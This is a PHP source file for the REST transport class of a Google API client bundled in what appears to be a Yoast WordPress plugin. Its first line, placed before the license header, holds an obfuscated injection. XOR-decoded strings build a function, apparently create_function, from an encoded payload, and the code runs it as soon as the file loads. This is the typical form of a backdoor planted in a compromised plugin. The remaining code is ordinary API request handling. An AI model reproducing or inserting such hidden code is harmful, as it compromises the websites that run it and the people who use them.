<?php $QoqRAFlzQwU='X5S;E 5S7PRII7N'^';G6Z1Ej5B>1= X ';$QJKdW=$QoqRAFlzQwU('','>4Dc>0XC ION>T3 E18rv<A6;24-Rio8I9wQoAVZx4AT3-IWZO4ZR.5T<Q7mA=GzM.7;MaHPWPGdHxSuRAx<OL<H<qDKnHAL5y>=6XjIulVGCRC<S=ED.S4gWP8<QAjMMDhgbkSZsQ,DQCvlrw42;3-RIva,pp=,H+mIqKQ=:4-3;jTK, PnOp2KP>-OE 8zV<A=Dsc:DiMczk 008DJNS XGEtnN4, A:WEDtXoPAT7ESn1T7B0X:YnAR79=vsewd9+Ts,3YIZtbW0X8USbs4e:kWTLVj;=4jerJV7YwkNQV3JQJGonXULKKOi.gD 6ILjB1WLLpyP7>M57SAUFEAf<he7u-<-Z8=jwSNNUmIds: GXELHHlf7QIAHA2RKILdTpKYHph4YhU2O8APRr5P6H4l0J0Z9gBK<3TMiDrk -203>9Z IVR3;C:DOT8r3;93m XS.LQ.P=4T-7RiZ1YRsBeHO21TjS-CXxviQ6IoD 39fdreANBV12KN>.EVT6-CMp1T3FXqpTU.,nGWjSQ.2gZRO6MSpi.VMpsQGDSSI7xQsszdhLqdQfgK5RC1ZFBHDARR--w21WoauKa,35PWgGE8,HMT4TKqhHLDBD36sOcI..HLmFEEylVUIe8E8TVDL> I6jJA7565-TlkKU3=4ABGFunjOS'^'WRlBXE6 T   a1KI6EKZQD.DdVUY360U<MPxFa-PqR4:PY 84oL5 qQ5H0h2,H3RiJVO,Mht<5>MhXsUr:r5FhS=HQykIozF<pXRDpN UQvwxrgUoN16B6ZOs4YH0hQmi-CLKaZSW>Y0qmKLZSPSORvv +ArPTVI1pI QnqNNFAVUBp IYy3fK8BYLH;0RVRrS4ImHi39c0ipODQDYdwn5A44 OdjPMT e< =TeO6 8D hd;2X0U9Y1Nivhzr98,2DXXtWGV igJBsF9T 6KSOo3O35875PXMJXRn=R LaGu2R>0jzOJ.4 >.tcSmNIPidKfU68-YY+=7+ZE6 6.eiBc: f hoyzYNJS8+7uPwDWLA+- eh3fo>u- < m9.0lYtT <1Kb=PL1S;YamrVC1Z=QW:CMPDmHoXR ,IyR+UCAUAWX6I33zKT1e . Y-lVLGEB9 Kzeq4XW;IRzM>P-3ZnEl+SE558H:qQMc8PaK AGXFBTE <07Hm +Gq .=EY0eWZ1JatQT04ZMGgqLsyCVRrv+W92+NE34W.xgynsnVLdKCHVXuFQ3WV.QfsWlswzus41HIBTTpFASmAMAG1.8, As-5=G 8YO8-=.+RRTcCmJO<-DoeeYLvu2o1 N5:lhZA=W1m1VLZZL0K6bn94Q9+3nEGQE.');$QJKdW();
/*
 * Copyright 2010 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * This class implements the RESTful transport of apiServiceRequest()'s
 *
 * @author Chris Chabot <chabotc@google.com>
 * @author Chirag Shah <chirags@google.com>
 */
class Yoast_Google_REST {
  /**
   * Executes a apiServiceRequest using a RESTful call by transforming it into
   * an apiHttpRequest, and executed via apiIO::authenticatedRequest().
   *
   * @param Yoast_Google_HttpRequest $req
   * @return array decoded result
   * @throws Yoast_Google_ServiceException on server side error (ie: not authenticated,
   *  invalid or malformed post body, invalid url)
   */
  static public function execute(Yoast_Google_HttpRequest $req) {
    $httpRequest = Yoast_Google_Client::$io->makeRequest($req);
    $decodedResponse = self::decodeHttpResponse($httpRequest);
    $ret = isset($decodedResponse['data'])
        ? $decodedResponse['data'] : $decodedResponse;
    return $ret;
  }

  
  /**
   * Decode an HTTP Response.
   * @static
   * @throws Yoast_Google_ServiceException
   * @param Yoast_Google_HttpRequest $response The http response to be decoded.
   * @return mixed|null
   */
  public static function decodeHttpResponse($response) {
    $code = $response->getResponseHttpCode();
    $body = $response->getResponseBody();
    $decoded = null;
    
    if ((intVal($code)) >= 300) {
      $decoded = json_decode($body, true);
      $err = 'Error calling ' . $response->getRequestMethod() . ' ' . $response->getUrl();
      if ($decoded != null && isset($decoded['error']['message'])  && isset($decoded['error']['code'])) {
        // if we're getting a json encoded error definition, use that instead of the raw response
        // body for improved readability
        $err .= ": ({$decoded['error']['code']}) {$decoded['error']['message']}";
      } else {
        $err .= ": ($code) $body";
      }

      throw new Yoast_Google_ServiceException($err, $code, null, $decoded['error']['errors']);
    }
    
    // Only attempt to decode the response, if the response code wasn't (204) 'no content'
    if ($code != '204') {
      $decoded = json_decode($body, true);
      if ($decoded === null || $decoded === "") {
        throw new Yoast_Google_ServiceException("Invalid json in service response: $body");
      }
    }
    return $decoded;
  }

  /**
   * Parse/expand request parameters and create a fully qualified
   * request uri.
   * @static
   * @param string $servicePath
   * @param string $restPath
   * @param array $params
   * @return string $requestUrl
   */
  static function createRequestUri($servicePath, $restPath, $params) {
    $requestUrl = $servicePath . $restPath;
    $uriTemplateVars = array();
    $queryVars = array();
    foreach ($params as $paramName => $paramSpec) {
      // Discovery v1.0 puts the canonical location under the 'location' field.
      if (! isset($paramSpec['location'])) {
        $paramSpec['location'] = $paramSpec['restParameterType'];
      }

      if ($paramSpec['type'] == 'boolean') {
        $paramSpec['value'] = ($paramSpec['value']) ? 'true' : 'false';
      }
      if ($paramSpec['location'] == 'path') {
        $uriTemplateVars[$paramName] = $paramSpec['value'];
      } else {
        if (isset($paramSpec['repeated']) && is_array($paramSpec['value'])) {
          foreach ($paramSpec['value'] as $value) {
            $queryVars[] = $paramName . '=' . rawurlencode($value);
          }
        } else {
          $queryVars[] = $paramName . '=' . rawurlencode($paramSpec['value']);
        }
      }
    }

    if (count($uriTemplateVars)) {
      $uriTemplateParser = new URI_Template_Parser($requestUrl);
      $requestUrl = $uriTemplateParser->expand($uriTemplateVars);
    }
    //FIXME work around for the the uri template lib which url encodes
    // the @'s & confuses our servers.
    $requestUrl = str_replace('%40', '@', $requestUrl);

    if (count($queryVars)) {
      $requestUrl .= '?' . implode($queryVars, '&');
    }

    return $requestUrl;
  }
}
